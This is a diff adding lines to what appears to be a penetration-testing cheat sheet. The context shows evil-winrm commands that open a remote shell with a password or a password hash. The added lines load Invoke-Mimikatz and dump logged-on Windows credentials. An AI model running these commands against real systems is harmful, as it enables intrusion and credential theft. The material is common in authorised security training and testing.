@@ -286,3 +286,7 @@ evil-winrm -i <IP> -u <USER> -p <PASSWORD>
 
 # maintaining access - persistence - get a shell with evil-winrm after getting a hash
 evil-winrm -i <IP> -u <USER> -H <HASH>
+
+# post-exploitation - powershell - dumping creds with mimikatz
+. .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"
